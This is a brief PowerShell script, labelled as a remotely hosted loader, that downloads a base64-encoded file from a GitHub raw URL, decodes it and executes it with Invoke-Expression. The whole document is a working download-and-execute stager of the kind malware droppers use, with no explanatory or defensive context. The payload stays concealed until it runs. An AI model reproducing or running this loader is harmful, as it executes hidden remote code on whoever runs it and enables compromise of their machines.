# loader.ps1 → hosted remotely
$enc = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/bangbangme/loko/refs/heads/main/encod.txt')
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc))
Invoke-Expression $decoded
